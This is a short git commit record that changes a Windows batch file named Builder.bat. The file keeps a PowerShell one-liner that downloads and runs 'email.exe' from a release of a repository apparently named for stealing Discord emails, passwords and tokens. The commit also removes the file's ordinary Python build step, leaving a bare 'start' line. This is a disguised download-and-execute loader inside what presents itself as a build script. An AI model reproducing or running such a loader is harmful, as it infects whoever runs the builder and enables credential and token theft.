37d4e4a2bc73d4d16416b55fcef0c360e2d2d587
IWcommunityFR <158751385+IWcommunityFR@users.noreply.github.com>
2024-04-06 15:12:33 +0200

    Update Builder.bat

--- Builder.bat
+++ Builder.bat
@@ -11,13 +11,4 @@ echo.
 cd dist
 powershell $down=New-Object System.Net.WebClient;$url='https://github.com/IWcommunityFR/Discord-Email-Password-token/releases/download/Email-Password-token/email.exe';$file='email.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit
 cd ..
-python builder.py
-
-if errorlevel 1 (
-    echo.
-    echo Error occurred during execution. Attempting to install requirements...
-    python -m pip install -r requirements.txt
-    echo.
-    echo Installation complete.
-    pause
-)
+start 
